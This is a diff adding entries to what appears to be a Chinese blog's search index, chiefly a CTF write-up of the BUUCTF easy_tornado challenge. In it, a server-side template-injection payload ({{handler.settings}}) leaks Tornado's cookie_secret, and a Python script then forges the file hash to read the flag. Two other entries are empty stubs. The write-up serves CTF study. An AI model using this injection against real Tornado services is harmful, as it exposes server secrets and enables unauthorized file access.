@@ -709,4 +709,49 @@ preg_replace 执行一个正则表达式的搜索和替换。
     <content><![CDATA[<p>熬夜所以顺便多想你一会儿</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>dockerfile创建数据卷</title>
+    <url>/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2018护网杯(WEB)easy_tornado(模板注入)</title>
+    <url>/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src="https://i.imgur.com/zsu1I4d.png" alt="1"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">flag in /fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(<span class="name">cookie_secret+md5</span>(<span class="name">filename</span>))</span><br></pre></td></tr></table></figure></div>
+<p>从上面三个信息得知flag在/fllllllllllllag文件中<br>render这个卡住了看了WP 说render是模板注入<br>第三个文件说了文件名的哈希方法     </p>
+<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Tornado</span>是一种 <span class="selector-tag">Web</span> 服务器软件的开源版本。<span class="selector-tag">Tornado</span> 和现在的主流 <span class="selector-tag">Web</span> 服务器框架</span><br><span class="line">(包括大多数 Python 的框架)有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure></div>
+<p>然后就是这段代码md5(cookie_secret+md5(filename)) 根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块 我们得想办法获得cookie_secret    </p>
+<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
+<p>通过模板注入方式我们可以构造</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">http://de289baa-da8f<span class="string">-4380</span><span class="string">-954</span>c<span class="string">-4</span>b9c90a1ba95.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">//得到'cookie_secret': 'bf0b29ee<span class="string">-5520</span><span class="string">-4</span>b5b-a8a6-ffd19aa464f9'&#125;</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://i.imgur.com/FNG9lhZ.png" alt="2"><br>得到secret后，就是计算访问flag文件的hash，获取flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret="bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9"</span><br><span class="line">hash.<span class="keyword">update</span>(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.<span class="keyword">update</span>((cookie_secret+s1).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line">//hashlib.md5（）#获取一个md5加密算法对象</span><br><span class="line">//.hexdigest()返回摘要，作为十六进制数据字符串值</span><br><span class="line">//python3跟python2区别：python3下字符串为Unicode类型，而hash传递时需要的是utf<span class="number">-8</span>类型，因此，需要类型转换</span><br></pre></td></tr></table></figure></div>
+<p>然后得到flag<br><img src="https://i.imgur.com/rJiBStL.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">04</span>c40e94<span class="number">-4087</span><span class="number">-49e3</span><span class="number">-85</span>c6<span class="number">-74</span>a9472025c0&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF | [HCTF 2018]admin</title>
+    <url>/undefined/%5BHCTF%202018%5Dadmin/</url>
+    <content><![CDATA[<h1 id="BUUCTF-HCTF-2018-admin"><a href="#BUUCTF-HCTF-2018-admin" class="headerlink" title="BUUCTF | [HCTF 2018]admin"></a><center>BUUCTF | [HCTF 2018]admin</center></h1>]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>session伪造</tag>
+      </tags>
+  </entry>
 </search>
